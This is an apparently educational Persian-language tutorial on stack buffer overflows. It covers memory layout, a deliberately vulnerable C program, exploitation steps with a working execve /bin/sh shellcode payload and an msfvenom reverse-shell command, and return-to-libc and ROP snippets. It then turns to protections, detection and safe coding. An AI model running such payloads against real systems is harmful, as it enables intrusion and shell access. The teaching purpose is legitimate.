---
title: سرریز بافر
description: درک و بهره‌برداری از آسیب‌پذیری‌های سرریز بافر
---

## سرریز بافر چیست؟

سرریز بافر زمانی رخ می‌دهد که داده‌های نوشته شده در بافر از حافظه اختصاص یافته آن فراتر رود و مکان‌های حافظه مجاور را بازنویسی کند. این می‌تواند منجر به کرش، اجرای کد یا افزایش امتیاز شود.

## انواع سرریز بافر

### سرریز مبتنی بر Stack
- رایج‌ترین نوع
- حافظه stack را بازنویسی می‌کند
- می‌تواند آدرس بازگشت را کنترل کند
- از فراخوانی‌های تابع سوءاستفاده می‌کند

### سرریز مبتنی بر Heap
- حافظه heap را بازنویسی می‌کند
- پیچیده‌تر برای بهره‌برداری
- آسیب‌پذیری‌های use-after-free

### سرریز Integer
- عملیات حسابی از مقدار حداکثر فراتر می‌رود
- می‌تواند منجر به سرریز بافر شود
- مثال: `int + int = منفی`

## آناتومی Stack

```
آدرس بالا
+------------------+
| آرگومان‌های خط فرمان|
+------------------+
| متغیرهای محیط    |
+------------------+
|     Stack        |  ← رشد به سمت پایین
|       ↓          |
+------------------+
|                  |
+------------------+
|       ↑          |
|      Heap        |  ← رشد به سمت بالا
+------------------+
|   BSS Segment    |
+------------------+
|   Data Segment   |
+------------------+
|   Text Segment   |
+------------------+
آدرس پایین
```

### فریم Stack
```
+------------------+  ← آدرس بالاتر
|  آرگومان‌های تابع  |
+------------------+
|  آدرس بازگشت     |  ← EIP (اشاره‌گر دستورالعمل)
+------------------+
|   EBP ذخیره شده  |  ← EBP (اشاره‌گر پایه)
+------------------+
|  متغیرهای محلی    |
+------------------+
|     بافر         |
+------------------+  ← ESP (اشاره‌گر Stack)
آدرس پایین‌تر
```

## مثال کد آسیب‌پذیر

### کد C
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // بدون بررسی محدوده!
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

### کامپایل
```bash
# کامپایل بدون حفاظت (برای یادگیری)
gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie

# اجرای عادی
./vuln "Hello"

# کرش با سرریز
./vuln $(python3 -c "print('A'*100)")
```

## مراحل بهره‌برداری

### 1. پیدا کردن آسیب‌پذیری
```bash
# فازینگ
for i in {1..100}; do
    echo "Testing with $i bytes"
    ./vuln $(python3 -c "print('A'*$i)")
done
```

### 2. تعیین Offset
```bash
# تولید الگوی منحصر به فرد
msf-pattern_create -l 200

# پیدا کردن offset جایی که EIP بازنویسی می‌شود
msf-pattern_offset -q 41304141  # مثال آدرس
```

### 3. کنترل EIP
```python
#!/usr/bin/env python3
# اثبات مفهوم

offset = 76  # Offset به EIP
eip = b"BBBB"  # بازنویسی با "BBBB"
padding = b"A" * offset

payload = padding + eip
print(payload.decode('latin-1'))
```

### 4. پیدا کردن آدرس بازگشت
```bash
# پیدا کردن JMP ESP یا gadget مشابه
msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp

# جستجو برای FFE4 در باینری
objdump -d vuln | grep "ff e4"
```

### 5. ایجاد Shellcode
```bash
# تولید shellcode با msfvenom
msfvenom -p linux/x86/exec CMD="/bin/sh" -b '\x00' -f python

# ریورس شل Windows
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -b '\x00\x0a' -f python
```

### 6. اکسپلویت نهایی
```python
#!/usr/bin/env python3

offset = 76
ret_addr = b"\x90\x91\x92\x93"  # آدرس JMP ESP (little-endian)
nop_sled = b"\x90" * 16  # NOP sled

# Shellcode (مثال - execve /bin/sh)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
    b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

padding = b"A" * (offset - len(nop_sled) - len(shellcode))
payload = padding + shellcode + nop_sled + ret_addr

with open("exploit.txt", "wb") as f:
    f.write(payload)

print(f"طول Payload: {len(payload)}")
```

## مکانیزم‌های حفاظت

### ASLR (تصادفی‌سازی چیدمان فضای آدرس)
```bash
# بررسی وضعیت ASLR
cat /proc/sys/kernel/randomize_va_space
# 0 = غیرفعال
# 1 = جزئی
# 2 = کامل

# غیرفعال (برای تست)
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# فعال
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

### Stack Canaries
```c
// کامپایلر مقدار canary اضافه می‌کند
void function() {
    unsigned long canary = STACK_CANARY;
    char buffer[64];
    // ... کد ...
    if (canary != STACK_CANARY) {
        abort();  // خردکردن Stack تشخیص داده شد!
    }
}
```

### DEP/NX (جلوگیری از اجرای داده)
```bash
# بررسی فعال بودن NX
readelf -l binary | grep GNU_STACK
# RWE = Stack قابل اجرا (آسیب‌پذیر)
# RW  = غیرقابل اجرا (محافظت شده)

# کامپایل با NX
gcc -o safe safe.c -z noexecstack
```

### PIE (اجرایی مستقل از موقعیت)
```bash
# کامپایل با PIE
gcc -o safe safe.c -fPIE -pie

# بررسی PIE
readelf -h binary | grep Type
# EXEC = بدون PIE
# DYN = با PIE
```

## دور زدن حفاظت‌ها

### Return-to-libc
```python
# به جای shellcode، فراخوانی system()
system_addr = 0xb7e4c060  # آدرس system()
exit_addr = 0xb7e3f4d0    # آدرس exit()
bin_sh = 0xb7f6d3cc       # آدرس "/bin/sh"

payload = padding + p32(system_addr) + p32(exit_addr) + p32(bin_sh)
```

### ROP (برنامه‌نویسی برگشت‌محور)
```python
# زنجیره کردن قطعات کد موجود (gadgets)
pop_eax = 0x080484d0      # pop eax; ret
pop_ebx = 0x080484d1      # pop ebx; ret
int_0x80 = 0x080484d2     # int 0x80; ret

# ساخت زنجیره ROP
rop_chain = p32(pop_eax) + p32(0xb) +  # sys_execve
            p32(pop_ebx) + p32(bin_sh_addr) + 
            p32(int_0x80)
```

## دیباگ با GDB

```bash
# بارگذاری باینری
gdb ./vuln

# تنظیم breakpoint
break vulnerable_function

# اجرا با ورودی
run $(python3 -c "print('A'*100)")

# بررسی stack
x/100x $esp

# بررسی رجیسترها
info registers

# گام به گام
stepi  # گام دستورالعمل
nexti  # دستورالعمل بعدی

# ادامه
continue
```

## تشخیص

### هشدارهای کامپایلر
```bash
gcc -Wall -Wextra -Werror vuln.c
# Warning: 'strcpy' خطرناک است
```

### تحلیل ایستا
```bash
# Flawfinder
flawfinder vuln.c

# Cppcheck
cppcheck vuln.c
```

### تشخیص زمان اجرا
- Stack canaries abort را فعال می‌کنند
- ASLR بهره‌برداری را سخت‌تر می‌کند
- DEP/NX از اجرای shellcode جلوگیری می‌کند

## روش‌های برنامه‌نویسی امن

### توابع امن
```c
// ناامن
strcpy(dest, src);
sprintf(buffer, "%s", input);
gets(buffer);

// جایگزین‌های امن
strncpy(dest, src, sizeof(dest)-1);
snprintf(buffer, sizeof(buffer), "%s", input);
fgets(buffer, sizeof(buffer), stdin);
```

### بررسی محدوده
```c
if (strlen(input) >= sizeof(buffer)) {
    fprintf(stderr, "ورودی خیلی طولانی\n");
    return;
}
```

### زبان‌های مدرن
- Python، Java، Rust: امن از نظر حافظه
- بررسی خودکار محدوده
- بدون مدیریت دستی حافظه

## منابع

- Smashing The Stack For Fun And Profit (Aleph One)
- The Shellcoder's Handbook
- Exploit Education: https://exploit.education
- ROPgadget: https://github.com/JonathanSalwan/ROPgadget
- pwntools: کتابخانه Python برای توسعه اکسپلویت
